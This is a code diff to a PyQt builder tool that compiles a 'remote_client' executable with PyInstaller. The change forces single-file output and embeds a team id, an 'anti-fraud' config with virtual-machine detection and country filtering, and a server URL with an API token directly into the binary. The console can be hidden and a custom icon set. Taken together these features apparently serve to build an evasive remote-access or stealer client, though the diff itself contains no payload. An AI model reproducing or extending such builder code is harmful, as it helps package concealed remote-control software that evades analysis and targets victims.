@@ -2,6 +2,7 @@ import importlib.util
 import os
 import subprocess
 import sys
+import tempfile
 from dataclasses import dataclass
 import json
 from pathlib import Path
@@ -47,6 +48,8 @@ class BuilderWorker(QtCore.QThread):
             self.finished.emit(False, "", "missing")
             return
 
+        self._cleanup_output_dir()
+        add_data_args, temp_dir = self._build_add_data_args()
         cmd = [
             sys.executable,
             "-m",
@@ -56,94 +59,102 @@ class BuilderWorker(QtCore.QThread):
             "--name",
             self.options.output_name,
         ]
-        cmd.append("--onefile" if self.options.mode == "onefile" else "--onedir")
+        cmd.append("--onefile")
         if self.options.console == "hide":
             cmd.append("--noconsole")
         if self.options.icon_path:
             cmd.extend(["--icon", str(self.options.icon_path)])
         cmd.extend(["--distpath", str(self.options.output_dir)])
+        cmd.extend(add_data_args)
         cmd.append(str(self.options.entrypoint))
 
         self.log_line.emit(" ".join(cmd))
-        process = subprocess.Popen(
-            cmd,
-            cwd=str(self.options.source_dir),
-            stdout=subprocess.PIPE,
-            stderr=subprocess.STDOUT,
-            text=True,
-        )
-        if process.stdout:
-            for line in process.stdout:
-                self.log_line.emit(line.rstrip())
-        exit_code = process.wait()
-        if exit_code == 0:
-            self._persist_build_metadata()
-            output = str(self.options.output_dir / f"{self.options.output_name}.exe")
-            self.finished.emit(True, output, "")
-        else:
-            self.finished.emit(False, "", "failed")
-
-    def _resolve_output_dir(self) -> Path | None:
-        output_dir = self.options.output_dir
-        if self.options.mode == "onedir":
-            output_dir = output_dir / self.options.output_name
         try:
-            output_dir.mkdir(parents=True, exist_ok=True)
-        except OSError:
-            self.log_line.emit("Failed to prepare the build directory.")
-            return None
-        return output_dir
+            process = subprocess.Popen(
+                cmd,
+                cwd=str(self.options.source_dir),
+                stdout=subprocess.PIPE,
+                stderr=subprocess.STDOUT,
+                text=True,
+            )
+            if process.stdout:
+                for line in process.stdout:
+                    self.log_line.emit(line.rstrip())
+            exit_code = process.wait()
+            if exit_code == 0:
+                output = str(self.options.output_dir / f"{self.options.output_name}.exe")
+                self.finished.emit(True, output, "")
+            else:
+                self.finished.emit(False, "", "failed")
+        finally:
+            if temp_dir is not None:
+                temp_dir.cleanup()
 
-    def _persist_build_metadata(self) -> None:
-        output_dir = self._resolve_output_dir()
-        if not output_dir:
-            return
-        self._persist_team_id_file(output_dir)
-        self._persist_antifraud_config(output_dir)
-        self._persist_server_config(output_dir)
-
-    def _persist_team_id_file(self, output_dir: Path) -> None:
-        team_id = (self.options.team_id or "").strip()
-        team_file = output_dir / "rc_team_id.txt"
-        if not team_id:
+    def _cleanup_output_dir(self) -> None:
+        output_dir = self.options.output_dir
+        for filename in ("rc_team_id.txt", "rc_antifraud.json", "rc_server.json"):
+            path = output_dir / filename
+            if not path.exists():
+                continue
             try:
-                if team_file.exists():
-                    team_file.unlink()
-                    self.log_line.emit(f"Removed {team_file}.")
+                path.unlink()
             except OSError:
-                self.log_line.emit("Failed to remove the team id file.")
-            return
+                self.log_line.emit(f"Failed to remove {filename} from output directory.")
+
+    def _build_add_data_args(self) -> tuple[list[str], tempfile.TemporaryDirectory | None]:
+        temp_dir = tempfile.TemporaryDirectory(prefix="rc_build_")
+        asset_dir = Path(temp_dir.name) / "remote_client"
+        try:
+            asset_dir.mkdir(parents=True, exist_ok=True)
+        except OSError:
+            self.log_line.emit("Failed to prepare embedded build assets.")
+            temp_dir.cleanup()
+            return [], None
+
+        args: list[str] = []
+        team_file = self._write_team_id_file(asset_dir)
+        if team_file:
+            args.extend(["--add-data", f"{team_file}{os.pathsep}remote_client"])
+        antifraud_file = self._write_antifraud_config(asset_dir)
+        if antifraud_file:
+            args.extend(["--add-data", f"{antifraud_file}{os.pathsep}remote_client"])
+        server_file = self._write_server_config(asset_dir)
+        if server_file:
+            args.extend(["--add-data", f"{server_file}{os.pathsep}remote_client"])
+        return args, temp_dir
+
+    def _write_team_id_file(self, asset_dir: Path) -> Optional[Path]:
+        team_id = (self.options.team_id or "").strip()
+        if not team_id:
+            return None
+        team_file = asset_dir / "rc_team_id.txt"
         try:
             team_file.write_text(team_id, encoding="utf-8")
-            self.log_line.emit(f"Wrote team id to {team_file}.")
+            return team_file
         except OSError:
             self.log_line.emit("Failed to write the team id file.")
+            return None
 
-    def _persist_antifraud_config(self, output_dir: Path) -> None:
+    def _write_antifraud_config(self, asset_dir: Path) -> Optional[Path]:
         payload = {
             "vm_enabled": bool(self.options.antifraud_vm),
             "region_enabled": bool(self.options.antifraud_region),
             "countries": list(self.options.antifraud_countries),
         }
-        config_file = output_dir / "rc_antifraud.json"
+        config_file = asset_dir / "rc_antifraud.json"
         try:
             config_file.write_text(json.dumps(payload, indent=2), encoding="utf-8")
-            self.log_line.emit(f"Wrote anti-fraud config to {config_file}.")
+            return config_file
         except OSError:
             self.log_line.emit("Failed to write the anti-fraud config file.")
+            return None
 
-    def _persist_server_config(self, output_dir: Path) -> None:
+    def _write_server_config(self, asset_dir: Path) -> Optional[Path]:
         server_url = (self.options.server_url or "").strip()
         token = (self.options.api_token or "").strip()
-        config_file = output_dir / "rc_server.json"
         if not server_url:
-            try:
-                if config_file.exists():
-                    config_file.unlink()
-                    self.log_line.emit(f"Removed {config_file}.")
-            except OSError:
-                self.log_line.emit("Failed to remove the server config file.")
-            return
+            return None
+        config_file = asset_dir / "rc_server.json"
         payload = {
             "server_url": server_url,
             "signaling_url": server_url,
@@ -154,9 +165,10 @@ class BuilderWorker(QtCore.QThread):
             payload["signaling_token"] = token
         try:
             config_file.write_text(json.dumps(payload, indent=2), encoding="utf-8")
-            self.log_line.emit(f"Wrote server config to {config_file}.")
+            return config_file
         except OSError:
             self.log_line.emit("Failed to write the server config file.")
+            return None
 
 
 class CompilerPage(QtWidgets.QWidget):
@@ -220,7 +232,7 @@ class CompilerPage(QtWidgets.QWidget):
         self.mode_label = QtWidgets.QLabel()
         self.mode_combo = QtWidgets.QComboBox()
         self.mode_combo.addItem(self.i18n.t("compiler_mode_onefile"), "onefile")
-        self.mode_combo.addItem(self.i18n.t("compiler_mode_onedir"), "onedir")
+        self.mode_combo.setEnabled(False)
 
         self.console_check = QtWidgets.QCheckBox()
 
@@ -296,8 +308,7 @@ class CompilerPage(QtWidgets.QWidget):
         self._set_selected_countries(countries)
         self.output_dir_input.setText(builder.get("output_dir", ""))
         self.icon_input.setText(builder.get("icon_path", ""))
-        mode = builder.get("mode", "onefile")
-        self.mode_combo.setCurrentIndex(0 if mode == "onefile" else 1)
+        self.mode_combo.setCurrentIndex(0)
         console = builder.get("console", "hide")
         self.console_check.setChecked(console == "show")
 
@@ -323,7 +334,6 @@ class CompilerPage(QtWidgets.QWidget):
         self.clear_button.setText(self.i18n.t("compiler_clear"))
         self.status_label.setText(self.i18n.t("compiler_status_idle"))
         self.mode_combo.setItemText(0, self.i18n.t("compiler_mode_onefile"))
-        self.mode_combo.setItemText(1, self.i18n.t("compiler_mode_onedir"))
         if self.log_output.toPlainText().strip() == "":
             self.log_output.setPlaceholderText(self.i18n.t("compiler_log_placeholder"))
         self._build_region_menu()
@@ -389,7 +399,7 @@ class CompilerPage(QtWidgets.QWidget):
         output_dir_text = self.output_dir_input.text().strip() or str(source_dir / "dist")
         output_dir = Path(output_dir_text)
         icon_path = Path(self.icon_input.text().strip()) if self.icon_input.text().strip() else None
-        mode = self.mode_combo.currentData()
+        mode = "onefile"
         console = "show" if self.console_check.isChecked() else "hide"
         server_url, api_token = self._resolve_server_settings()
 
@@ -529,7 +539,7 @@ class CompilerPage(QtWidgets.QWidget):
                 },
                 "output_dir": str(options.output_dir),
                 "icon_path": str(options.icon_path) if options.icon_path else "",
-                "mode": options.mode,
+                "mode": "onefile",
                 "console": options.console,
             },
         )
